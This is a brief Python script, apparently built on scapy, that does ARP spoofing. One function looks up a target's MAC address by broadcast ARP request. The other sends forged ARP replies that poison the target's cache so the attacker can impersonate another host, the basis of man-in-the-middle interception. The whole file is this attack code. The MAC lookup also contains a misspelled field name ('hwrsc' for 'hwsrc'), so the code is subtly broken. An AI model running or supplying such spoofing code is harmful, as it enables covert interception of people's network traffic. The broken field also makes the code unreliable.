#!/usr/bin/env python3

import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answ_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    
    return answ_list[0][1].hwrsc
   


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)